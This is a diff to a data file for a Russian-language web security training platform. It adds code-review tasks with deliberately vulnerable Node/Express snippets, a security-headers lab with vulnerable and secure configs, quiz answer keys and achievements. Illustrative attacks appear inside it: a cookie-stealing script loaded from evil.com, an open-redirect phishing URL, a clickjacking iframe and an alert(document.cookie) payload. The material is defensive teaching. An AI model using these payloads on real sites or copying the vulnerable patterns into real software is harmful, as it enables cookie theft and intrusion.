-    description: 'Интерактивный гид по 10 самым критическим угрозам безопасности веб-приложений с примерами кода и способами защиты.',
+    description: 'Интерактивный гид по 10 самым критическим угрозам безопасности веб-приложений с примерами кода, реальными кейсами и способами защиты.',
     icon: 'Shield',
     difficulty: 'Начальный',
     difficultyColor: 'bg-green-100 text-green-800',
@@ -1336,27 +1898,27 @@ export const modules = [
   {
     id: 'sql-injection',
     title: 'SQL-инъекции',
-    description: 'Практическая лаборатория по изучению SQL-инъекций: от простого обхода аутентификации до сложных атак UNION.',
+    description: 'Практическая лаборатория: 11 заданий от простого обхода аутентификации до WAF Bypass, Out-of-band и Polyglot-атак.',
     icon: 'Database',
     difficulty: 'Средний',
     difficultyColor: 'bg-yellow-100 text-yellow-800',
-    lessons: 4,
-    totalSteps: 4,
+    lessons: 11,
+    totalSteps: 11,
   },
   {
     id: 'xss',
     title: 'XSS-атаки',
-    description: 'Изучите три типа XSS-уязвимостей: отражённый, хранимый и DOM-based. Интерактивные демонстрации атак.',
+    description: 'Изучите 6 типов XSS: отражённый, хранимый, DOM-based, SVG, Markdown и PDF. Интерактивные демонстрации атак.',
     icon: 'FileText',
     difficulty: 'Средний',
     difficultyColor: 'bg-yellow-100 text-yellow-800',
-    lessons: 3,
-    totalSteps: 3,
+    lessons: 6,
+    totalSteps: 6,
   },
   {
     id: 'csrf',
     title: 'CSRF-атаки',
-    description: 'Визуальная симуляция CSRF-атаки с пошаговой демонстрацией и механизмами защиты.',
+    description: 'Визуальная симуляция CSRF-атаки с пошаговой демонстрацией, SameSite cookie и механизмами защиты.',
     icon: 'Link',
     difficulty: 'Средний',
     difficultyColor: 'bg-yellow-100 text-yellow-800',
@@ -1366,22 +1928,22 @@ export const modules = [
   {
     id: 'auth',
     title: 'Аутентификация',
-    description: 'Тренажёры: проверка надёжности пароля, визуализация брутфорса, демо хеширования, безопасность сессий.',
+    description: 'Тренажёры: проверка надёжности пароля, визуализация брутфорса, демо bcrypt-хеширования, интерактивный TOTP/2FA, безопасность JWT-сессий.',
     icon: 'Lock',
     difficulty: 'Начальный',
     difficultyColor: 'bg-green-100 text-green-800',
-    lessons: 4,
-    totalSteps: 4,
+    lessons: 5,
+    totalSteps: 5,
   },
   {
     id: 'secure-coding',
     title: 'Безопасное кодирование',
-    description: 'Задачи по ревью кода: найдите уязвимость в фрагменте кода и выберите правильное решение.',
+    description: '15 задач по ревью кода: найдите уязвимость (SQLi, XSS, IDOR, SSRF, XXE, Race Condition) и выберите правильное решение.',
     icon: 'Code',
     difficulty: 'Продвинутый',
     difficultyColor: 'bg-red-100 text-red-800',
-    lessons: 5,
-    totalSteps: 5,
+    lessons: 15,
+    totalSteps: 15,
   },
   {
     id: 'tools',
@@ -1392,6 +1954,16 @@ export const modules = [
     difficultyColor: 'bg-green-100 text-green-800',
     lessons: 4,
     totalSteps: 4,
+  },
+  {
+    id: 'security-headers',
+    title: 'Security Headers',
+    description: 'Интерактивный гид по HTTP-заголовкам безопасности: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.',
+    icon: 'ShieldCheck',
+    difficulty: 'Средний',
+    difficultyColor: 'bg-yellow-100 text-yellow-800',
+    lessons: 6,
+    totalSteps: 6,
   },
 ];
 
@@ -1584,6 +2156,392 @@ app.post('/api/profile', (req, res) => {
     explanation:
       'Race Condition возникает при одновременных запросах: два запроса читают баланс 100, оба проверяют >= 50, оба списывают 50 → баланс становится -50. Атомарная операция UPDATE ... WHERE balance >= ? гарантирует, что проверка и обновление выполняются как единая операция без промежутка.',
   },
+  {
+    id: 'sc-11',
+    title: 'Open Redirect — перенаправление на вредоносный сайт',
+    category: 'Контроль доступа',
+    code: `app.get('/api/redirect', (req, res) => {
+  const url = req.query.url;
+  res.redirect(url);
+  // Атака: /api/redirect?url=https://evil.com/phishing
+  // Пользователь видит знакомый домен, но перенаправляется на фишинговый сайт
+});`,
+    options: [
+      { text: 'Проверять, что URL начинается с разрешённого домена: if (!url.startsWith(\'https://myapp.com/\')) return 400', correct: true },
+      { text: 'Использовать res.send вместо res.redirect', correct: false },
+      { text: 'Кодировать URL через encodeURIComponent', correct: false },
+      { text: 'Добавить заголовок Referer', correct: false },
+    ],
+    explanation:
+      'Open Redirect позволяет злоумышленнику использовать доверенный домен для перенаправления на фишинговый сайт. Злоумышленник отправляет victim.com/api/redirect?url=evil.com, и пользователь доверяет переходу, так как начинается с victim.com. Решение — белый список разрешённых доменов.',
+  },
+  {
+    id: 'sc-12',
+    title: 'IDOR — небезопасная прямая ссылка на объект',
+    category: 'Контроль доступа',
+    code: `app.get('/api/documents/:id', (req, res) => {
+  // Любой аутентифицированный пользователь может получить любой документ
+  const doc = await db.getDocument(req.params.id);
+  res.json(doc);
+  // Атака: пользователь с id=5 запросит /api/documents/100
+  // и получит документ другого пользователя
+});`,
+    options: [
+      { text: 'Проверять, что документ принадлежит текущему пользователю: if (doc.userId !== req.user.id) return 403', correct: true },
+      { text: 'Шифровать ID документа', correct: false },
+      { text: 'Использовать POST вместо GET', correct: false },
+      { text: 'Добавить логирование запросов', correct: false },
+    ],
+    explanation:
+      'IDOR (Insecure Direct Object Reference) возникает, когда приложение не проверяет, что пользователь имеет права на доступ к указанному объекту. Злоумышленник меняет ID в URL и получает доступ к данным других пользователей. Необходимо проверять принадлежность ресурса.',
+  },
+  {
+    id: 'sc-13',
+    title: 'CORS Misconfiguration — неправильная настройка CORS',
+    category: 'Сетевая безопасность',
+    code: `app.use((req, res, next) => {
+  // Опасно: разрешает ЛЮБОЙ домен
+  res.header('Access-Control-Allow-Origin', req.headers.origin);
+  res.header('Access-Control-Allow-Credentials', 'true');
+  next();
+});`,
+    options: [
+      { text: 'Указать конкретные разрешённые домены вместо динамического origin', correct: true },
+      { text: 'Убрать заголовок Access-Control-Allow-Credentials', correct: false },
+      { text: 'Запретить все CORS-запросы', correct: false },
+      { text: 'Использовать HTTPS вместо HTTP', correct: false },
+    ],
+    explanation:
+      'Установка Access-Control-Allow-Origin в req.headers.origin позволяет ЛЮБОМУ сайту делать запросы с credentials (куки). Злоумышленник создаёт сайт, который делает запрос к уязвимому API, и браузер отправляет куки. Решение — жёстко указать разрешённые домены.',
+  },
+  {
+    id: 'sc-14',
+    title: 'API Key Exposure — раскрытие ключей API в клиентском коде',
+    category: 'Конфигурация',
+    code: `// Клиентский React-компонент
+const API_KEY = 'sk-1234567890abcdef';
+const API_URL = 'https://api.openai.com/v1/chat';
+
+async function sendMessage(msg) {
+  const res = await fetch(API_URL, {
+    method: 'POST',
+    headers: {
+      'Authorization': \`Bearer \${API_KEY}\`,
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ messages: [{ role: 'user', content: msg }] })
+  });
+  return res.json();
+}`,
+    options: [
+      { text: 'Вызывать API через серверный прокси-эндпоинт, не раскрывая ключ на клиенте', correct: true },
+      { text: 'Обфусцировать API_KEY в JavaScript', correct: false },
+      { text: 'Использовать HTTPS вместо HTTP', correct: false },
+      { text: 'Закодировать ключ через Base64', correct: false },
+    ],
+    explanation:
+      'Любые данные в клиентском JavaScript доступны пользователю через DevTools. API-ключ на клиенте может быть извлечён любым посетителем сайта. Решение — серверный прокси-эндпоинт, который вызывает внешний API, не раскрывая ключ.',
+  },
+  {
+    id: 'sc-15',
+    title: 'File Upload — небезопасная загрузка файлов',
+    category: 'Контроль доступа',
+    code: `app.post('/api/upload', (req, res) => {
+  const file = req.files.document;
+  // Сохраняем файл с оригинальным именем
+  file.mv(\`uploads/\${file.name}\`);
+  res.json({ url: \`/uploads/\${file.name}\` });
+  // Атака: загрузка shell.php, который выполнится на сервере
+});`,
+    options: [
+      { text: 'Проверять расширение, MIME-type, генерировать случайное имя файла и хранить вне webroot', correct: true },
+      { text: 'Разрешить только изображения', correct: false },
+      { text: 'Ограничить размер файла до 1MB', correct: false },
+      { text: 'Шифровать файл перед сохранением', correct: false },
+    ],
+    explanation:
+      'Загрузка файлов без проверки типа и имени позволяет злоумышленнику загрузить исполняемый файл (.php, .jsp, .asp), который сервер выполнит. Защита: белый список расширений, проверка MIME-type (не только extension), генерация случайного имени, хранение вне webroot, антивирусная проверка.',
+  },
+];
+
+// ============================================================
+// Security Headers Lab Data
+// ============================================================
+export interface SecurityHeader {
+  id: string;
+  name: string;
+  category: string;
+  description: string;
+  attackDemo: string;
+  vulnerableConfig: string;
+  secureConfig: string;
+  quiz: { question: string; options: string[]; correctIndex: number; explanation: string };
+}
+
+export const securityHeaders: SecurityHeader[] = [
+  {
+    id: 'csp',
+    name: 'Content-Security-Policy',
+    category: 'Защита от XSS',
+    description:
+      'CSP — самый мощный HTTP-заголовок для защиты от XSS. Он определяет, откуда браузер может загружать скрипты, стили, изображения, шрифты и другие ресурсы. Правильно настроенный CSP блокирует выполнение inline-скриптов и загрузку ресурсов с неавторизованных доменов.',
+    attackDemo:
+      'Без CSP злоумышленник внедряет <script src="https://evil.com/steal.js"></script> через XSS. Браузер выполняет скрипт, который отправляет cookies на сервер злоумышленника. С CSP «script-src \'self\'» — браузер блокирует загрузку внешнего скрипта.',
+    vulnerableConfig: `// Нет CSP — браузер загружает скрипты отовсюду
+app.use((req, res, next) => {
+  // Никаких ограничений на источники ресурсов
+  next();
+});
+
+// Злоумышленник может:
+// 1. Загрузить скрипт с любого CDN
+// 2. Выполнить inline-скрипт <script>alert(1)</script>
+// 3. Подключить iframe с фишинговым сайтом`,
+    secureConfig: `// Строгий CSP через helmet
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'"],                    // Только свой домен
+    styleSrc: ["'self'", "'unsafe-inline'"],  // Свой + inline стили
+    imgSrc: ["'self'", 'data:', 'https:'],    // Свой + data + HTTPS
+    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
+    frameSrc: ["'none'"],                     // Запрет iframe
+    objectSrc: ["'none'"],                    // Запрет flash/object
+    upgradeInsecureRequests: [],              // HTTP → HTTPS
+  }
+}));`,
+    quiz: {
+      question: 'Какая CSP-директива блокирует все inline-скрипты?',
+      options: ["script-src 'unsafe-inline'", "script-src 'self'", "default-src *", "script-src 'none'"],
+      correctIndex: 1,
+      explanation: "script-src 'self' разрешает загрузку скриптов только с текущего домена. Inline-скрипты (<script>тег</script>) и обработчики событий (onclick) блокируются. Для разрешения конкретного inline-скрипта нужен nonce или hash.",
+    },
+  },
+  {
+    id: 'hsts',
+    name: 'Strict-Transport-Security',
+    category: 'Защита соединения',
+    description:
+      'HSTS заставляет браузер всегда использовать HTTPS для данного домена, даже если пользователь вводит http://. Это предотвращает downgrade-атаки (SSL stripping), при которых злоумышленник на уровне сети конвертирует HTTPS-соединение в HTTP.',
+    attackDemo:
+      'Без HSTS: пользователь вводит http://bank.com. MITM-атакующий (через публичный Wi-Fi) перехватывает запрос и не перенаправляет на HTTPS. Пароль передаётся в открытом виде. С HSTS: браузер помнит, что bank.com всегда HTTPS, и автоматически использует защищённое соединение.',
+    vulnerableConfig: `// Нет HSTS
+app.use((req, res, next) => {
+  // Пользователи могут зайти по HTTP
+  // Нет принудительного редиректа на HTTPS
+  next();
+});
+
+// Атака SSL Strip:
+// 1. Пользователь: http://bank.com
+// 2. Атакующий: перехватывает, не редиректит
+// 3. Пароль передаётся открытым текстом`,
+    secureConfig: `// HSTS через helmet
+app.use(helmet.hsts({
+  maxAge: 31536000,       // 1 год (в секундах)
+  includeSubDomains: true, // Все поддомены тоже HTTPS
+  preload: true           // Включить в HSTS preload list браузера
+}));
+
+// Или вручную:
+res.setHeader(
+  'Strict-Transport-Security',
+  'max-age=31536000; includeSubDomains; preload'
+);
+
+// Редирект HTTP → HTTPS
+app.use((req, res, next) => {
+  if (req.protocol === 'http') {
+    res.redirect(301, 'https://' + req.get('host') + req.url);
+  } else {
+    next();
+  }
+});`,
+    quiz: {
+      question: 'Что делает директива preload в HSTS?',
+      options: [
+        'Предзагружает SSL-сертификат',
+        'Добавляет домен в встроенный список HSTS браузеров',
+        'Ускоряет HTTPS-соединение',
+        'Включает HSTS только для поддоменов',
+      ],
+      correctIndex: 1,
+      explanation: 'preload добавляет домен в HSTS Preload List — список, встроенный в браузеры (Chrome, Firefox, Safari). Даже первый визит на сайт будет через HTTPS, без необходимости сначала получить HSTS-заголовок.',
+    },
+  },
+  {
+    id: 'x-frame-options',
+    name: 'X-Frame-Options',
+    category: 'Защита от кликджекинга',
+    description:
+      'X-Frame-Options запрещает встраивание страницы в iframe, frame или object. Это защита от clickjacking — атаки, при которой невидимый iframe с целевым сайтом накладывается на видимую страницу, заставляя пользователя нажать на кнопку, которую он не видит.',
+    attackDemo:
+      'Без X-Frame-Options: злоумышленник создаёт страницу с прозрачным iframe, содержащим bank.com/transfer. Пользователь думает, что нажимает на кнопку «Получить приз», но на самом деле подтверждает перевод денег.',
+    vulnerableConfig: `// Нет X-Frame-Options
+app.use((req, res, next) => {
+  // Любой сайт может встроить вашу страницу в iframe
+  next();
+});
+
+// Атака clickjacking:
+// <iframe src="https://bank.com/transfer"
+//         style="opacity:0; position:absolute;
+//                top:100px; left:100px;">
+// </iframe>
+// <button style="position:absolute; top:100px; left:100px;">
+//   Получить приз!
+// </button>`,
+    secureConfig: `// Через helmet
+app.use(helmet.frameguard({ action: 'deny' }));
+
+// Или вручную:
+res.setHeader('X-Frame-Options', 'DENY');
+// SAMEORIGIN — разрешить iframe только с того же домена
+// DENY — полностью запретить встраивание
+
+// Современная альтернатива через CSP:
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    frameAncestors: ["'self'"], // Или 'none'
+  }
+}));`,
+    quiz: {
+      question: 'Какое значение X-Frame-Options полностью запрещает встраивание страницы в iframe?',
+      options: ['SAMEORIGIN', 'ALLOW-FROM', 'DENY', 'BLOCK'],
+      correctIndex: 2,
+      explanation: 'DENY полностью запрещает встраивание страницы в iframe. SAMEORIGIN разрешает встраивание только с того же домена. ALLOW-FROM (deprecated) разрешал указание конкретного домена.',
+    },
+  },
+  {
+    id: 'x-content-type',
+    name: 'X-Content-Type-Options',
+    category: 'Защита от MIME-sniffing',
+    description:
+      'X-Content-Type-Options: nosniff запрещает браузеру определять MIME-тип файла по содержимому. Без этого заголовка браузер может интерпретировать файл с расширением .jpg как JavaScript, если содержимое выглядит как JS-код.',
+    attackDemo:
+      'Злоумышленник загружает файл avatar.jpg, содержащий: /* это изображение */ alert(document.cookie);. Без nosniff браузер видит JavaScript и выполняет его, несмотря на расширение .jpg. Это называется MIME-type sniffing attack.',
+    vulnerableConfig: `// Нет X-Content-Type-Options
+app.use(express.static('uploads'));
+// Пользователь загружает файл:
+// Content-Type: image/jpeg
+// Содержимое: <script>alert('XSS')</script>
+
+// Без nosniff:
+// - Chrome: определяет по содержимому → исполняет как JS
+// - Firefox: определяет по содержимому → исполняет как JS`,
+    secureConfig: `// Через helmet
+app.use(helmet.noSniff());
+
+// Или вручную:
+res.setHeader('X-Content-Type-Options', 'nosniff');
+
+// Также важно: правильная отдача файлов
+app.get('/uploads/:filename', (req, res) => {
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('Content-Disposition', 'attachment');
+  res.sendFile(path.join(__dirname, 'uploads', req.params.filename));
+});`,
+    quiz: {
+      question: 'Что предотвращает X-Content-Type-Options: nosniff?',
+      options: [
+        'Загрузку файлов без расширения',
+        'Интерпретацию браузером файла как другого MIME-типа',
+        'Скачивание вредоносных файлов',
+        'Изменение Content-Type сервером',
+      ],
+      correctIndex: 1,
+      explanation: 'nosniff запрещает браузеру «угадывать» MIME-тип по содержимому файла. Браузер будет использовать только заголовок Content-Type, указанный сервером. Это предотвращает атаки, где файл с «безопасным» расширением содержит вредоносный код.',
+    },
+  },
+  {
+    id: 'referrer-policy',
+    name: 'Referrer-Policy',
+    category: 'Защита приватности',
+    description:
+      'Referrer-Policy контролирует, сколько информации о предыдущей странице передаётся в заголовке Referer при переходе на другой сайт. Это важно для приватности — Referer может содержать sensitive данные (URL с параметрами, токены, поисковые запросы).',
+    attackDemo:
+      'Без Referrer-Policy: пользователь переходит с bank.com/transfer?token=abc123 на внешний сайт. Заголовок Referer: https://bank.com/transfer?token=abc123 передаётся внешнему серверу, раскрывая токен авторизации.',
+    vulnerableConfig: `// Нет Referrer-Policy
+// Браузер по умолчанию отправляет полный URL
+// Referer: https://myapp.com/dashboard?user_id=123&session=abc
+
+// Внешний сайт видит:
+// - user_id пользователя
+// - session token
+// - путь к странице
+// - параметры запроса`,
+    secureConfig: `// Через helmet
+app.use(helmet.referrerPolicy({
+  policy: 'strict-origin-when-cross-origin'
+}));
+
+// Или вручную:
+res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+
+// Варианты:
+// no-referrer          — никогда не отправлять Referer
+// same-origin          — только для того же домена
+// strict-origin        — только домен (без пути) для HTTPS→HTTPS
+// strict-origin-when-cross-origin — полный URL для same-origin, только домен для cross-origin (рекомендуется)`,
+    quiz: {
+      question: 'Какое значение Referrer-Policy рекомендуется по умолчанию?',
+      options: [
+        'no-referrer',
+        'unsafe-url',
+        'strict-origin-when-cross-origin',
+        'same-origin',
+      ],
+      correctIndex: 2,
+      explanation: 'strict-origin-when-cross-origin отправляет полный URL для навигации внутри того же домена, и только домен (без пути и параметров) для кросс-доменных переходов. Это баланс между функциональностью и приватностью.',
+    },
+  },
+  {
+    id: 'permissions-policy',
+    name: 'Permissions-Policy',
+    category: 'Контроль API браузера',
+    description:
+      'Permissions-Policy ограничивает использование браузерных API (камера, микрофон, геолокация, USB, Bluetooth и др.) для текущего документа и iframe. Замена устаревшего Feature-Policy. Защищает от злоупотребления API браузера через XSS или вредоносные iframe.',
+    attackDemo:
+      'Без Permissions-Policy: злоумышленник через XSS получает доступ к navigator.geolocation и отслеживает местоположение пользователя. Или использует navigator.mediaDevices.getUserMedia() для доступа к камере/микрофону.',
+    vulnerableConfig: `// Нет Permissions-Policy
+app.use((req, res, next) => {
+  // Все API браузера доступны:
+  // - Камера и микрофон
+  // - Геолокация
+  // - USB-устройства
+  // - Bluetooth
+  // - Clipboard
+  // - Accelerometer, Gyroscope
+  next();
+});`,
+    secureConfig: `// Запретить все неиспользуемые API
+res.setHeader('Permissions-Policy', [
+  'camera=()',           // Запрет камеры
+  'microphone=()',       // Запрет микрофона
+  'geolocation=()',      // Запрет геолокации
+  'usb=()',              // Запрет USB
+  'bluetooth=()',        // Запрет Bluetooth
+  'clipboard-read=()',   // Запрет чтения буфера
+  'clipboard-write=()',  // Запрет записи в буфер
+  'accelerometer=()',    // Запрет акселерометра
+  'gyroscope=()',        // Запрет гироскопа
+  'payment=(self)',      // Разрешить только для same-origin
+].join(', '));
+
+// Разрешить только необходимые:
+// Permissions-Policy: geolocation=(self), camera=()`,
+    quiz: {
+      question: 'Что делает директива camera=() в Permissions-Policy?',
+      options: [
+        'Разрешает камеру для всех',
+        'Запрещает использование камеры',
+        'Разрешает камеру только для localhost',
+        'Требует HTTPS для камеры',
+      ],
+      correctIndex: 1,
+      explanation: 'camera=() с пустыми скобками означает «ни для кого». Это эквивалент DENY. camera=(self) разрешает только для same-origin. camera=(self https://trusted.com) разрешает для текущего домена и указанного источника.',
+    },
+  },
 ];
 
 // ============================================================
@@ -1648,6 +2606,42 @@ export const achievements = [
     id: 'full-completion',
     title: 'Полное прохождение',
     description: 'Завершите все обучающие модули платформы.',
-    condition: 'Пройдите все 7 модулей',
+    condition: 'Пройдите все 8 модулей',
+  },
+  {
+    id: 'csrf-shield',
+    title: 'Щит от CSRF',
+    description: 'Изучите модуль CSRF-атак и механизмы защиты.',
+    condition: 'Пройдите модуль CSRF',
+  },
+  {
+    id: 'owasp-half',
+    title: 'Полпути к OWASP',
+    description: 'Изучите минимум 5 из 10 категорий OWASP Top 10.',
+    condition: 'Изучите 5 пунктов OWASP Top 10',
+  },
+  {
+    id: 'quiz-all',
+    title: 'Квиз-энциклопедист',
+    description: 'Пройдите квизы во всех 7 категориях.',
+    condition: 'Завершите 7 квизов',
+  },
+  {
+    id: 'crypto-explorer',
+    title: 'Исследователь криптографии',
+    description: 'Используйте все инструменты в модуле «Инструменты безопасности».',
+    condition: 'Попробуйте все криптографические инструменты',
+  },
+  {
+    id: 'coding-pro',
+    title: 'Профессионал код-ревью',
+    description: 'Правильно решите минимум 8 из 15 задач безопасного кодирования.',
+    condition: 'Решите 8+ задач на безопасное кодирование',
+  },
+  {
+    id: 'headers-guard',
+    title: 'Страж заголовков',
+    description: 'Изучите все 6 Security Headers и правильно ответьте на квизы.',
+    condition: 'Пройдите модуль Security Headers',
   },
 ];
